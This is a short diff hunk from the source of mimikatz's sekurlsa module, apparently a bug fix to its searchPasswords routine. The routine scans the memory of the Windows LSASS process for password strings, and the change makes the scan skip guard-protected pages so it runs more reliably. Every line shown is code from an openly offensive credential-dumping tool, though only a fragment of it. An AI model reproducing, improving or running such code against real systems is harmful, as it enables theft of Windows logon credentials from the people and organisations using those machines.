@@ -305,7 +305,7 @@ bool mod_mimikatz_sekurlsa::searchPasswords(vector<wstring> * arguments)
 				MEMORY_BASIC_INFORMATION mesInfos;
 				if(VirtualQueryEx(hLSASS, pMemoire, &mesInfos, sizeof(MEMORY_BASIC_INFORMATION)) > 0)
 				{
-					if((mesInfos.Protect & PAGE_READWRITE) && (mesInfos.Type == MEM_PRIVATE))
+					if((mesInfos.Protect & PAGE_READWRITE) && !(mesInfos.Protect & PAGE_GUARD) && (mesInfos.Type == MEM_PRIVATE))
 					{
 						UNICODE_STRING donnees[3];
 						for(PBYTE pZone = reinterpret_cast<PBYTE>(mesInfos.BaseAddress); pZone < (reinterpret_cast<PBYTE>(mesInfos.BaseAddress) + mesInfos.RegionSize - 3*sizeof(UNICODE_STRING)); pZone += sizeof(DWORD))
